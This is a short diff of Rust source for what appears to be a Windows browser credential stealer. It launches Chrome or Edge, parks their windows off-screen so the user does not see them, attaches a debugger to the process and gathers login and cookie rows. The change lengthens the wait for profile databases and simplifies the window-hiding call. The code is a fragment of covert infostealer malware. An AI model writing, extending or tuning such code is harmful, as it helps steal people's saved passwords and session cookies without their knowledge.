@@ -23,7 +23,9 @@ const CHROME_EXE: &str = r"C:\Program Files\Google\Chrome\Application\chrome.exe
 const EDGE_EXE: &str = r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe";
 
 /// How long to wait for the spawned browser to load its profile databases.
-const PROFILE_DB_TIMEOUT: Duration = Duration::from_secs(15);
+/// Edge in particular does extra first-launch work after being killed, so
+/// keep this generous.
+const PROFILE_DB_TIMEOUT: Duration = Duration::from_secs(30);
 
 struct BrowserSpec {
     name: &'static str,
@@ -130,7 +132,7 @@ fn process_browser(spec: &BrowserSpec) -> Option<(Vec<LoginRow>, Vec<CookieRow>)
     }
 
     // Park the browser's windows off-screen while we work.
-    process::park_windows_offscreen(pi.dwProcessId, PROFILE_DB_TIMEOUT + Duration::from_secs(10));
+    process::park_windows_offscreen(pi.dwProcessId);
 
     if let Err(e) = unsafe { DebugActiveProcess(pi.dwProcessId) } {
         crate::log_err!("[-] DebugActiveProcess failed: {e}");
